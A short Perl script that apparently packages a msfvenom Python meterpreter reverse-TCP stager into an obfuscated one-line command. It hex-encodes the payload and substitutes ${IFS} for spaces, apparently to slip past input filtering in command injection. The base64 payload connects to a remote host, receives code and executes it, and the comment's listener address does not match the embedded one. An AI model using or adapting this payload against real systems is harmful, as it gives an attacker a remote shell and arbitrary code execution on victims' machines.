#!/usr/bin/perl

# Script to encode python payloads within a perl wrapper.
# This makes it possible to remove/encode any and all spaces in the payload.

use Encode;
use warnings;

# msfvenom -p python/meterpreter/revers_tcp LHOST=10.0.0.1 LPORT=8181 -f raw
my $python_payload = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC4yMzAuMTYyLjgyJyw4MDgxKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))";
#my $python_payload = "print('Test Success!')";

my $cmd = encode("utf8", "python -c \"$python_payload\""); # Make sure python payload is UTF-8
my $packed = unpack("H*", $cmd); # Encode adn pack the payload to hex
my $leng = length($packed); # Calculate the length of the payload

my $final_payload = "perl\${IFS}-e\${IFS}'system(pack(qq,H$leng,,qq,$packed,))'"; # Construct final string with ${IFS} as space substitution

print "$final_payload";
